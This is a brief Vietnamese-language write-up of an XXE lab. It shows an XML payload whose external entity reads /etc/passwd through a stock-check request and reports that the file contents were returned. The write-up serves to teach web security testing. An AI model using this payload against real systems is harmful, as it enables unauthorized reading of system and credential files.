# 1. Exploiting XXE using external entities to retrieve files
Ta thấy chức năng stock check có body là một đoạn mã XML. Như vậy ta có thẻ exploit bằng cách chèn đoạn code sau vào body:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
Kết quả nội dung file /etc/passwd được in ra thành công
![image](https://user-images.githubusercontent.com/103978452/205596701-bb968712-24a2-4d79-94cd-6247202fb977.png)
